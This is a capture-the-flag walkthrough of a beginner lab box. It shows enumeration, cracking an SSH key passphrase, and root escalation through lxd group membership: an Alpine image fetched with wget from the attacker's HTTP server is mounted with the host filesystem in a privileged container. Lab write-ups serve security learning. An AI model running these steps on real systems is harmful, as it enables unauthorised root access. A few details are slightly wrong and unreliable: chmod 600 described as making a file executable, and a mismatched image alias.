> An Easy Boot2Root box for beginners
#### User Flag
1. Started off with basic enumeration
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
2. Navigating to the webpage, I clicked around until I found the `/uploads` path
3. I also found the username `john` in the source code
4. This contained an image, dictionary list, and hacker manifesto
5. I ran steg checks on the image but came up with nothing so I moved on from that
6. Next I ran gobuster to look for other paths `gobuster dir -u 10.10.239.127 -w /usr/share/dirb/wordlists/common.txt`
7. That revealed `robots.txt` which also directs you tot eh `/uploads` path, as well as `/secret`
8. The secret path contained an rsa private key, which I assumed was to use for ssh
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
[ ETC ]
```
9. I downloaded the key and ran `chmod 600` to make it executable
10. To log in to ssh with the private key, we need the passphrase
11. I used `ssh2john secretKey` to convert the hash to a crackable format first
12. Then I ran `john gs-rsa --wordlist="dict.lst"` to crack the passphrase
```shell
└─$ ssh -i secretKey john@10.10.239.127 
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
```
13. The user flag was in john's home directory
#### Priv Escalation
1. Since I can't run `sudo -l` with no password, I had to find a differnt method to gain root
2. First I checked `/etc/crontab` but that didn't contain anything
3. Running `id` on john, I found an interesting group called `lxd`
```shell
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
4. lxd deals with linux containers similar to an application like docker
5. To exploit this, I downloaded `lxd-alpine-builder` on my attack machine
```shell
└─$ git clone https://github.com/saghul/lxd-alpine-builder.git
└─$ cd lxd-alpine-builder 
└─$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
```
6. Now we have to build it (I chose i686 architecture to be safe but it probably should work with x86, just build without -a)
```shell
└─$ sudo ./build-alpine -a i686
└─$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  alpine-v3.19-i686-20240410_2128.tar.gz  build-alpine  LICENSE  README.md
```
7. To transfer the image, I launched a python server on my attack machine with `python3 -m http.server`
```shell
john@exploitable:~$ wget http://10.2.91.174:8000/alpine-v3.19-i686-20240410_2128.tar.gz
john@exploitable:~$ lxc image import alpine-v3.19-i686-20240410_2128.tar.gz --alias alp
Image imported with fingerprint: 9040fc16bbd675e014c9bfe0bcad601e2b8f54e93a1c109d912fc829030d1f5b
```
8. You can check the image specifications like architecture and size with `lxc image list`
9. Now we just create the instance as privileged, add access to the host device, and launch
```shell
john@exploitable:~$ lxc init alpine gameserv -c security.privileged=true
Creating gameserv
john@exploitable:~$ lxc config device add gameserv host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to gameserv
john@exploitable:~$ lxc start gameserv
john@exploitable:~$ lxc exec gameserv /bin/sh
~ # whoami
root
```
10. The root flag wasn't in `/root` (evil if you ask me) so I dug around manually for about 25 seconds before just using find
```shell
/ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
/ # cd mnt/root/root/
/mnt/root/root # ls
root.txt
```
12. Done!
